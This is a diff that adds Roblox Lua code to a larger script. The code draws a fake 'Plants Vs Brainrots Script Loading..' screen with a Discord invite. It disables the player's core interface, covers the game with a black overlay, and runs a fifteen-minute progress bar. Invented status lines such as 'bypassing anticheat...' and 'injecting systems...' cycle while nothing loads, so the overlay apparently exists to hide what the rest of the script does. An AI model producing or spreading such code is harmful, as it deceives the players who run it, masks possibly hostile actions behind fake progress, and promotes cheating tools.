@@ -549,3 +549,154 @@ triggerClient1()
 end
 end
 end)
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+pcall(function()
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+pcall(function()
+	gui.Parent = CoreGui
+end)
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.fromScale(1,1)
+bg.BackgroundColor3 = Color3.new(0,0,0)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.fromScale(1,0.1)
+title.Position = UDim2.fromScale(0,0.25)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(200,150,255)
+title.Font = Enum.Font.GothamBlack
+title.TextScaled = true
+title.Text = "Plants Vs Brainrots Script Loading.."
+title.Parent = bg
+
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.fromScale(1,0.05)
+sub.Position = UDim2.fromScale(0,0.35)
+sub.BackgroundTransparency = 1
+sub.TextColor3 = Color3.fromRGB(180,180,180)
+sub.Font = Enum.Font.Gotham
+sub.TextScaled = true
+sub.Text = "initializing..."
+sub.Parent = bg
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.fromScale(0.6,0.05)
+barBg.Position = UDim2.fromScale(0.2,0.75)
+barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
+barBg.BorderSizePixel = 0
+barBg.Parent = bg
+
+local bgCorner = Instance.new("UICorner")
+bgCorner.CornerRadius = UDim.new(0,20)
+bgCorner.Parent = barBg
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(160,0,255)
+stroke.Thickness = 2
+stroke.Parent = barBg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.fromScale(0,1)
+barFill.BackgroundColor3 = Color3.fromRGB(170,0,255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(0,20)
+fillCorner.Parent = barFill
+
+local text = Instance.new("TextLabel")
+text.Size = UDim2.fromScale(1,1)
+text.BackgroundTransparency = 1
+text.TextColor3 = Color3.new(1,1,1)
+text.Font = Enum.Font.GothamBold
+text.TextScaled = true
+text.Text = "Loading... 0%"
+text.Parent = barBg
+
+local discordLabel = Instance.new("TextLabel")
+discordLabel.Size = UDim2.fromScale(1,0.03)
+discordLabel.Position = UDim2.fromScale(0,0.82)
+discordLabel.BackgroundTransparency = 1
+discordLabel.TextColor3 = Color3.new(1,1,1)
+discordLabel.Font = Enum.Font.Gotham
+discordLabel.TextScaled = true
+discordLabel.Text = "Join our Discord: https://discord.gg/rV7ReMVgxP"
+discordLabel.Parent = bg
+
+local fruits = {"🍎","🍌","🍓","🍇","🍉","🍍","🍒","🥭"}
+
+task.spawn(function()
+	while true do
+		local f = Instance.new("TextLabel")
+		f.Size = UDim2.fromOffset(40,40)
+		f.BackgroundTransparency = 1
+		f.TextScaled = true
+		f.Font = Enum.Font.GothamBold
+		f.Text = fruits[math.random(#fruits)]
+		f.Position = UDim2.fromScale(math.random(), -0.1)
+		f.Rotation = math.random(0,360)
+		f.Parent = bg
+
+		local t = math.random(6,10)
+		TweenService:Create(
+			f,
+			TweenInfo.new(t, Enum.EasingStyle.Linear),
+			{Rotation = f.Rotation + math.random(360,720)}
+		):Play()
+
+		local fall = TweenService:Create(
+			f,
+			TweenInfo.new(t, Enum.EasingStyle.Linear),
+			{Position = UDim2.fromScale(f.Position.X.Scale, 1.1)}
+		)
+
+		fall:Play()
+		fall.Completed:Connect(function()
+			f:Destroy()
+		end)
+
+		task.wait(0.3)
+	end
+end)
+
+local messages = {
+	"bypassing anticheat...",
+	"loading important modules...",
+	"injecting systems...",
+	"syncing assets...",
+	"finalizing setup..."
+}
+
+task.spawn(function()
+	local i = 1
+	while true do
+		sub.Text = messages[i]
+		i = i % #messages + 1
+		task.wait(4)
+	end
+end)
+
+local totalTime = 900
+local start = os.clock()
+
+RunService.RenderStepped:Connect(function()
+	local elapsed = math.clamp(os.clock() - start, 0, totalTime)
+	local progress = elapsed / totalTime
+	barFill.Size = UDim2.fromScale(progress,1)
+	text.Text = "Loading... "..math.floor(progress * 100).."%"
+end)
